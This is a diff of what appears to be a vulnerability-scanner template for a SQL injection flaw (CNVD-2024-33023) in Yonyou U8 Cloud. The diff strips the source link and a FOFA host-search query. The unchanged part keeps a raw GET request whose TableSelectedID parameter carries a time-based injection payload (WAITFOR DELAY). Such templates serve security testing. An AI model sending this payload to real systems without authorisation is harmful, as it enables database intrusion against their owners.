@@ -3,12 +3,8 @@ info:
   name: 用友U8 Cloud ReleaseRepMngAction 存在SQL注入漏洞(CNVD-2024-33023)
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ynqp28ry4uya244m'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ynqp28ry4uya244m
-    fofa: title=="U8C"
 http:
 - raw:
   - 'GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
